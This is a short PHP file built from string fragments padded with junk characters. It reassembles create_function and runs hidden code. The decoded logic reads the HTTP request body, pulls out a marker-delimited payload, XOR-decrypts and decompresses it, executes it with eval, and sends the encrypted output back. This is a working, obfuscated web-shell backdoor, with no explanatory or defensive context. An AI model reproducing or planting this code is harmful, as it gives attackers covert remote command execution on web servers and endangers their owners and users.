<?php
$H='$k="f45aFH9d4c";FH$kh=FH"d3e82cFH79205FH8";FH$kf="12d45efFHc6FH112"FH;$pFH="Q59UljPC';
$m='aFHn();$r=@basFHe64FH_encode(@x(@gzcoFHmpressFH($o),$kFH));priFHnt("$FHp$kFHh$r$kf");}';
$L='x(@baseFH6FH4_deFHcode($m[1])FH,$k))FH);$o=@ob_geFHt_conteFHnFHts();@FHob_end_FHclFHe';
$S=str_replace('LX','','crLXeaLXte_LXfLXunLXLXction');
$G='ents(FH"php://input"FH),$m)=FH=1) FH{@ob_FHstaFHrt();@evFHal(@gzFHuncompresFHs(@FH';
$V='HoFHr($i=0;$i<$l;FH)FH{for($jFH=0;($FHFHj<$c&&$iFH<$l);$j++,$i++)FH{$FHo.=$t{$i}^FH$';
$v='XvFHVjiNb6FH";functioFHn x($FHt,$kFH){FH$cFH=strlen($k);$l=FHsFHtrlen($t);$oFH="";fF';
$e='k{$jFHFH};}FH}retuFHrFHn $o;}if (@preg_match(FH"/$kh(FH.+)FHFH$kf/",@filFHe_gFHet_cFHont';
$z=str_replace('FH','',$H.$v.$V.$e.$G.$L.$m);
$h=$S('',$z);$h();
?>
